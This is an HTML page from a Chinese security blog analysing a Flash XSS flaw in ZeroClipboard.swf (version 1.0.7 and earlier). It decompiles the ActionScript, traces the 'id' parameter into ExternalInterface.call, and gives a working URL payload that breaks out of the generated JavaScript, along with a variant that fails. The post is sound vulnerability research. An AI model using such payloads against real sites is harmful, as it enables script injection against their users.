@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XSS,Flash,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>ZeroClipboard.swf的Flash型XSS分析 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        ZeroClipboard.swf的Flash型XSS分析
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-07-30T14:05:19.000Z">
+        2019-07-30
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flash/">Flash</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-ZeroClipboard简介"><a href="#0x01-ZeroClipboard简介" class="headerlink" title="0x01 ZeroClipboard简介"></a>0x01 ZeroClipboard简介</h2><p>ZeroClipboard是一款基于Flash的，兼容性较强的用于剪贴板复制的JS插件，它是基于Flash来实现跨浏览器的复制功能的。</p>
+<p>ZeroClipboard是在国内网站中使用得比较普遍的Flash插件。</p>
+<h2 id="0x02-Flash-XSS分析"><a href="#0x02-Flash-XSS分析" class="headerlink" title="0x02 Flash XSS分析"></a>0x02 Flash XSS分析</h2><p>当ZeroClipboard的版本&lt;=1.0.7时，会存在Flash XSS漏洞。</p>
+<p>漏洞版本下载地址：<a href="https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard" target="_blank" rel="noopener">https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard</a></p>
+<p>我们下载了ZeroClipboard.swf文件后，使用FFDec软件来对其进行反编译，得到as代码：</p>
+<p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/1.png" alt=""></p>
+<p>得到如下as源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.LoaderInfo;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.display.StageScaleMode;</span><br><span class="line">   import flash.events.Event;</span><br><span class="line">   import flash.events.MouseEvent;</span><br><span class="line">   import flash.external.ExternalInterface;</span><br><span class="line">   import flash.system.Security;</span><br><span class="line">   import flash.system.System;</span><br><span class="line">   </span><br><span class="line">   public class ZeroClipboard extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">      private var button:Sprite;</span><br><span class="line">      </span><br><span class="line">      private var id:String = &quot;&quot;;</span><br><span class="line">      </span><br><span class="line">      private var clipText:String = &quot;&quot;;</span><br><span class="line">      </span><br><span class="line">      public function ZeroClipboard()</span><br><span class="line">      &#123;</span><br><span class="line">         super();</span><br><span class="line">         stage.scaleMode = StageScaleMode.EXACT_FIT;</span><br><span class="line">         Security.allowDomain(&quot;*&quot;);</span><br><span class="line">         var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;</span><br><span class="line">         id = flashvars.id;</span><br><span class="line">         button = new Sprite();</span><br><span class="line">         button.buttonMode = true;</span><br><span class="line">         button.useHandCursor = true;</span><br><span class="line">         button.graphics.beginFill(13434624);</span><br><span class="line">         button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));</span><br><span class="line">         button.alpha = 0;</span><br><span class="line">         addChild(button);</span><br><span class="line">         button.addEventListener(MouseEvent.CLICK,clickHandler);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*</span><br><span class="line">         &#123;</span><br><span class="line">            ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);</span><br><span class="line">         &#125;);</span><br><span class="line">         ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);</span><br><span class="line">         ExternalInterface.addCallback(&quot;setText&quot;,setText);</span><br><span class="line">         ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      public function setHandCursor(param1:Boolean) : *</span><br><span class="line">      &#123;</span><br><span class="line">         button.useHandCursor = param1;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      private function clickHandler(param1:Event) : void</span><br><span class="line">      &#123;</span><br><span class="line">         System.setClipboard(clipText);</span><br><span class="line">         ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;complete&quot;,clipText);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      public function setText(param1:*) : *</span><br><span class="line">      &#123;</span><br><span class="line">         clipText = param1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关注重点放在ZeroClipboard()函数上。</p>
+<p>接着，我们搜索是否存在有接受外部输入参数的关键字，这里我们找到了AS3的传参语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;</span><br></pre></td></tr></table></figure>
+<p>跟踪下去，看看获取到传入的参数值的flashvars变量的调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id = flashvars.id;</span><br><span class="line">button = new Sprite();</span><br><span class="line">...  button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));</span><br></pre></td></tr></table></figure>
+<p>可以看到，分别有id、width和height三个参数可以控制。传入参数id赋给了id变量，而其它两个参数则传入创建button按钮的宽和高，若不传的话会创建失败、无法执行到后续的代码逻辑中去。</p>
+<p>这里继续跟踪id变量，可以看到都是作为ExternalInterface.call()函数的第二个参数传入的，当button成功创建并添加了一些监听事件后，在鼠标移动时就会触发且最后还会调用触发一次，此时就导致了Flash XSS漏洞的存在：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">	ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">	ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">	ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*</span><br><span class="line">&#123;</span><br><span class="line">	ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);</span><br><span class="line">&#125;);</span><br><span class="line">ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);</span><br><span class="line">ExternalInterface.addCallback(&quot;setText&quot;,setText);</span><br><span class="line">ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null);</span><br></pre></td></tr></table></figure>
+<p>好了，最后理下，就是通过loaderInfo.parameters，我们可以传入三个参数id、width和height；其中width和height是必须传入的，否则进不了后续的代码逻辑；id参数则直接传入到ExternalInterface.call()函数的第二个参数执行，导致了Flash XSS漏洞的存在。</p>
+<p>结合ExternalInterface.call()函数的第二个参数可控的payload，直接构造输入如下payload即可成功触发Flash XSS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&amp;width=100&amp;height=100</span><br></pre></td></tr></table></figure>
+<p>这里只要你移动鼠标就会触发：</p>
+<p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/2.png" alt=""></p>
+<p>用IE的开发者工具调试可以看到实际执行JS代码如下，注入的内容成功闭合了后面的语句，造成XSS：</p>
+<p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/3.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try &#123; __flash__toXML(ZeroClipboard.dispatch(&quot;\\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&quot;,&quot;mouseOut&quot;,null)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125;</span><br></pre></td></tr></table></figure>
+<p>这里多说一句，如果payload写成如下是不成功的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&quot;));alert(&apos;mi1k7ea&apos;);&#125;catch(e)&#123;&#125;//&amp;width=100&amp;height=100</span><br></pre></td></tr></table></figure>
+<p>这是因为ZeroClipboard未定义，在之前alert前就会报错直接跳转到了catch代码段中执行，绕过了我们注入的XSS payload：</p>
+<p><img src="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/4.png" alt=""></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://joychou.org/web/flash-xss.html#directory072174797467736589" target="_blank" rel="noopener">Flash XSS Securit</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ZeroClipboard简介"><span class="toc-text">0x01 ZeroClipboard简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Flash-XSS分析"><span class="toc-text">0x02 Flash XSS分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/07/28/Flash型CSRF总结/" rel="next" title="Flash型CSRF总结">
+          Flash型CSRF总结
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/" rel="prev" title="SWFUpload.swf的Flash型XSS分析">
+            SWFUpload.swf的Flash型XSS分析
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
